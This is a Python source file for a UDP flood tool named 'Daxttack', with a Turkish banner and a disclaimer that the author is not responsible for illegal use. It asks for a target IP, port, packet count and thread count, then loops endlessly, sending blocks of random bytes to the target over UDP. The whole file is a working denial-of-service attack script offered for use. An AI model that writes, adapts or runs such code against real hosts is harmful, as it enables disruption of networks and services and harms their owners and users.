
#Developed By Daxtill
import random
import socket
import threading
import time,sys,socket,threading,logging,urllib.request,random
import argparse
import os 
import tools.addons.clean1
import tools.addons.logo
import tools.addons.clean

#Dosyaya git
os.chdir(os.path.dirname(os.path.realpath(__file__)))

print (''' \033[36m  
        
       ███████                       ██     ██                     ██
      ░██░░░░██                     ░██    ░██                    ░██
      ░██    ░██  ██████   ██   ██ ██████ ██████  ██████    █████ ░██  ██
      ░██    ░██ ░░░░░░██ ░░██ ██ ░░░██░ ░░░██░  ░░░░░░██  ██░░░██░██ ██
      ░██    ░██  ███████  ░░███    ░██    ░██    ███████ ░██  ░░ ░████
      ░██    ██  ██░░░░██   ██░██   ░██    ░██   ██░░░░██ ░██   ██░██░██
      ░███████  ░░████████ ██ ░░██  ░░██   ░░██ ░░████████░░█████ ░██░░██
      ░░░░░░░    ░░░░░░░░ ░░   ░░    ░░     ░░   ░░░░░░░░  ░░░░░  ░░  ░

                                                                  By Daxtill

                             |Daxttack | UDP | 

				             A:T:T:A:C:K:E:R


         NOT:İLLEGAL OLARAK KULLANILMASI BENİM SORUMLULUĞUMDA DEĞİLDİR\033[0m''')
print ("\033[32m------------------------------------------------------------------------------------\033[0m")
host = str(input("\033[32m Ip Adresi > \033[0m"))
port = int(input("\033[33m Port > \033[0m"))
times = int(input("\033[36mTek bağlantı başına paket sayısı > \033[0m"))
threads = int(input("\033[32m Thread > \033[0m"))

if __name__ == '__main__':
	     


	data = random._urandom(1024)
	i = random.choice(("\033[33m[DAXBOT]\033[0m","\033[34m[DAXTTACK]\033[0m","\033[35m[DAXY]\033[0m" , "\033[36m[UDP]\033[0m "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(host),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[32mPaket Gönderimi Başarılı !\033[32m")
		except:
			print("\033[31m[!] Hata\033[32m")

		
	
		
